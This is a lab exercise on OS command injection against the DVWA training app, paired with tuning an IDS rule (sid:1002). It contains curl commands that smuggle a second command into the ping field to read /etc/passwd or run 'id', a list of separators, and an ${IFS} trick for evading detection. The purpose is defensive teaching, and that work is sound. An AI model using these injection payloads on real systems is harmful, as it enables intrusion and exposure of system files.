# Exercise 3 — OS Command Injection (T1059)

**Goal:** run OS commands through the DVWA "Command Injection" page and trip
sid:1002.

## Attack

The page pings a host you supply; chain a second command onto it:

```bash
curl -s "http://proxy/vulnerabilities/exec/" \
  -b "security=low; PHPSESSID=<your-session>" \
  --data-urlencode "ip=127.0.0.1; cat /etc/passwd" \
  --data "Submit=Submit"

# other separators to try: &&  |  $(...)  `...`
curl -s "http://proxy/vulnerabilities/exec/?ip=127.0.0.1%26%26id&Submit=Submit" \
  -b "security=low; PHPSESSID=<your-session>"
```

## Defend

Expect:

```text
🔴 [HIGH] sid:1002 OS command injection attempt ... | MITRE T1059
```

- sid:1002 keys on separators (`;`, `&&`, `|`, backticks) followed by a command.
- **Tune it:** add commands the rule misses (`curl`, `wget`, `python`), then try
  to *evade* your own rule (e.g. `${IFS}` instead of a space). Can the detector
  still see it? This is exactly the cat-and-mouse of real detection engineering.
